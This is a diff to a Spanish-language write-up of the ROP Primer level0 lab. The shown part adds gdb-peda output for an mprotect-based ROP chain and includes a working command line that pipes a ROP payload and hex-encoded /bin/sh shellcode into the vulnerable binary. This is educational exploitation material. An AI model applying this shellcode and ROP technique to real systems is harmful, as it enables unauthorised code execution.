@@ -686,6 +686,7 @@ El binario "peta" cuando le metes más de 44 caracteres. Se trata ahora de busca
     ECX = 0x0 (NULL)
     EDX = 0x0 (NULL)
 ```
+
 Este es el python que hice después de buscar los gadgets necesarios con la herramienta ropme:
 
 ```python
@@ -782,6 +783,18 @@ https://xmgv.wordpress.com/2015/08/15/rop-primer-level-0/
 
 Se trata de utilizar la función mprotect para cambiar los permisos de un bloque de la memoria y hacer que sea ejecutable. Luego se llama a la función 'read' que va a leer el shellcode (/bin/sh) que le viene por pantalla y lo guarda en el bloque de memoria, previamente manipulado para que sea ejecutable. Por último se hace una llamada al comando cat para que ejecute el shellcode y se muestre por pantalla.
 
+Valores útiles que vamos a necesitar para hacer el exploit:
+```
+gdb-peda$ p mprotect
+$1 = {<text variable, no debug info>} 0x80523e0 <mprotect>
+```
+```
+gdb-peda$ vmmap 
+Start      End        Perm	Name
+0x08048000 0x080ca000 r-xp	/root/Documents/Seccon/ropvulnhub/level0/level0
+0x080ca000 0x080cb000 rw-p	/root/Documents/Seccon/ropvulnhub/level0/level0
+...
+```
 Este es el python:
 
 ```python
@@ -825,10 +838,16 @@ payload += p(0x100)         # nbyte
 
 print payload
 ```
-Y aquí el comando que se ejecuta para explotar el binario:
+Si ejecutáis dentro de gdb, se puede ver como el bloque de memoria es ejecutable después de hacer la llamada a mprotect:
 ```
-(python ./bueno.py; python -c 'print "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"'; cat) | ./level0
+gdb-peda$ vmmap 
+Start      End        Perm	Name
+0x08048000 0x080ca000 r-xp	/root/Documents/Seccon/ropvulnhub/level0/level0
+0x080ca000 0x080cb000 rwxp	/root/Documents/Seccon/ropvulnhub/level0/level0
 ```
+
+Y aquí la ejecucción del exploit:
+
 ```
 level0@rop:~$ (python ./bueno.py; python -c 'print "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"'; cat) | ./level0
 [+] ROP tutorial level0
